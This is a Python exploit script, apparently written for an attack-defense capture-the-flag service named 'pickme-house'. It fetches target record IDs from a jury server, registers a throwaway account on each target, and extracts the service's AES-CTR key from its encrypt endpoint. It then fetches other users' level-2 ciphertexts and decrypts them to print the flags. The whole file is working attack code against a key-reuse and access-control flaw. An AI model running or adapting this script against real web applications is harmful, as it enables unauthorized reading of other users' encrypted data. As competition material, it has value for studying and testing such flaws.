import sys
import json
import requests
import secrets
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from Crypto.Util import Counter


JURY_IP = "10.10.10.10"
IP = sys.argv[1]
BASE_APP = f"http://{IP}:10000"

def get_attack_data():
    
    data = requests.get(f"http://{JURY_IP}/api/client/attack_data").json()['pickme-house'][IP]
    idlvl2 = []
    
    for item in data:
        user = {}
        item = item.replace("'", '"')
        user = json.loads(item)

        if  user.get('level', '').strip() == '2':
            rec_id = user.get('rec_id')
            if rec_id:
                idlvl2.append(rec_id)

    return idlvl2

def register_user(session, username, password):
    url = f"{BASE_APP}/register"
    data = {
        'user': username,
        'pwd': password,
        'pwd2': password
    }
    session.cookies.clear()
    response = session.post(url, data=data, allow_redirects=False)
    location = response.headers.get('Location', '')
    return response.status_code == 302 and 'login' in location

def login_user(session, username, password):
    url = f"{BASE_APP}/login"
    data = {
        'user': username,
        'pwd': password
    }
    response = session.post(url, data=data, allow_redirects=True)
    return '/index' in response.url or '/login' not in response.url

def get_level2_data(session, rec_id):
    url = f"{BASE_APP}/lookup"
    data = {
        'level': '2',
        'rec_id': rec_id
    }
    response = session.post(url, data=data)
    if response.status_code != 200:
        return None, None
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    if soup.find(string=lambda text: text and ('Нет такой записи' in text)):
        return None, None
    
    field_rows = soup.find_all('div', class_='field-row')
    
    ct_hex = None
    nonce_hex = None
    
    for row in field_rows:
        label = row.find('div', class_='field-label')
        value = row.find('div', class_='field-value')
        
        if not label or not value:
            continue
        
        label_text = label.get_text(strip=True)
        value_text = value.get_text(strip=True)
        
        if 'Шифротекстик' in label_text:
            ct_hex = value_text
        elif 'Nonce' in label_text:
            nonce_hex = value_text
    
    if not (ct_hex and nonce_hex):
        return None, None
    
    return ct_hex, nonce_hex

def decrypt_level2(ct_hex, nonce_hex, key_hex):
    ciphertext = bytes.fromhex(ct_hex)
    key = bytes.fromhex(key_hex)
    nonce = bytes.fromhex(nonce_hex)
    
    ctr = Counter.new(64, prefix=nonce)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    plaintext = cipher.decrypt(ciphertext)
    
    try:
        return plaintext.decode('utf-8')
    except UnicodeDecodeError:
        return plaintext.hex()

def get_key_from_encryption(session):
    test_plaintext = "test"
    url = f"{BASE_APP}/process"
    data = {
        'action': 'encrypt',
        'level': '2',
        'plaintext': test_plaintext
    }
    response = session.post(url, data=data)
    if response.status_code != 200:
        return None
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    strong_tags = soup.find_all('strong')
    for strong in strong_tags:
        if 'Ключик' in strong.get_text():
            parent = strong.parent
            if parent:
                text_nodes = []
                for node in parent.descendants:
                    if isinstance(node, str) and node.strip():
                        text_nodes.append(node.strip())
                
                full_text = ' '.join(text_nodes)
                parts = full_text.split('Ключик')
                if len(parts) > 1:
                    key_part = parts[1].strip()
                    for text in text_nodes:
                        if text in key_part:
                            key_candidate = text.strip()
                            if len(key_candidate) == 32:
                                try:
                                    test_bytes = bytes.fromhex(key_candidate)
                                    if len(test_bytes) == 16:
                                        return key_candidate
                                except ValueError:
                                    continue
                
                next_sibling = strong.next_sibling
                while next_sibling:
                    if isinstance(next_sibling, str):
                        key_candidate = next_sibling.strip()
                        if len(key_candidate) == 32:
                            try:
                                test_bytes = bytes.fromhex(key_candidate)
                                if len(test_bytes) == 16:
                                    return key_candidate
                            except ValueError:
                                pass
                    elif hasattr(next_sibling, 'get_text'):
                        text = next_sibling.get_text(strip=True)
                        if len(text) == 32:
                            try:
                                test_bytes = bytes.fromhex(text)
                                if len(test_bytes) == 16:
                                    return text
                            except ValueError:
                                pass
                    next_sibling = next_sibling.next_sibling
    
    divs = soup.find_all('div')
    for div in divs:
        text = div.get_text()
        if 'Ключик' in text:
            parts = text.split('Ключик')
            if len(parts) > 1:
                key_part = parts[1]
                for word in key_part.split():
                    word = word.strip()
                    if len(word) == 32:
                        try:
                            test_bytes = bytes.fromhex(word)
                            if len(test_bytes) == 16:
                                return word
                        except ValueError:
                            continue
    
    return None

def main():
    
    session = requests.Session()
    pickmeloxi = get_attack_data()

    for lox_id in pickmeloxi:
        username = f"pickmelox{secrets.token_hex(8)}"
        password = secrets.token_hex(16)
        
        if not register_user(session, username, password):
            print("не удалось зарегистрировать пользователя")
            return
        
        if not login_user(session, username, password):
            print("не удалось войти")
            return
        
        key_hex = get_key_from_encryption(session)
        if not key_hex:
            print("не удалось получить ключ")
            return
        
        ct_hex, nonce_hex = get_level2_data(session, lox_id)
        
        if not ct_hex or not nonce_hex:
            print("не удалось получить данные")
            return
        
        plaintext = decrypt_level2(ct_hex, nonce_hex, key_hex)
        print(plaintext)

if __name__ == '__main__':
    main()

